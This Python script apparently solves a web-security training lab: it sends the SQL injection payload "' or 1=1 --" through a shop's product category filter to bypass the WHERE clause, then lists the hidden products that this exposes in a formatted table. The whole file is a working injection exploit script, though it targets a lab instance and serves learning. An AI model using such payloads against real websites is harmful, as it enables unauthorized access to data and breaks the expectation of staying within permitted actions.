from collections import namedtuple
import requests
from lxml import html

from http import HTTPStatus
from rich.console import Console
from rich.table import Table

console = Console()

SERVER="https://0a1c00bc0425e53cc0db434500860051.web-security-academy.net"
ENDPOINT="/filter?category="
PAYLOAD="' or 1=1 --"

Product = namedtuple("Product", "name price rate link")


def parse_product(product):
    name = product.xpath("h3")[0].text
    price = product.xpath("img")[1].tail.strip()
    rate = '⭐' * int(product.xpath("img/@src")[1][-5])
    link = product.xpath("a/@href")[0]
    link = f"{SERVER}{link}"
    return Product(name, price, rate, link)


def fetch_products(payload = None):
    res = []
    response = requests.get(f"{SERVER}{ENDPOINT}{payload}" if payload is not None else f"{SERVER}")
    if response.status_code == HTTPStatus.OK:
        html_document = html.fromstring(response.content)
        products = html_document.xpath("//section[@class='container-list-tiles']/div")
        res += [parse_product(product) for product in products]
    return res


with console.status("Fetching all products..."):
    all_products = fetch_products()
    console.log(f"Fetched {len(all_products)} products (ordinary path)")
with console.status("Fetching really all products..."):
    really_all_products = fetch_products(PAYLOAD)
    console.log(f"Fetched {len(really_all_products)} products (unexpected path)")
with console.status("Discovering hidden products..."):

    hidden_products = [product for product in really_all_products if product not in all_products]
    console.log(f"Discovered {len(hidden_products)} products")

table = Table(title="Hidden Products")
table.add_column("Product Name")
table.add_column("Price")
table.add_column("Rate")
table.add_column("Link")
for product in hidden_products:
    table.add_row(product.name, product.price, product.rate, product.link)
console.print(table)
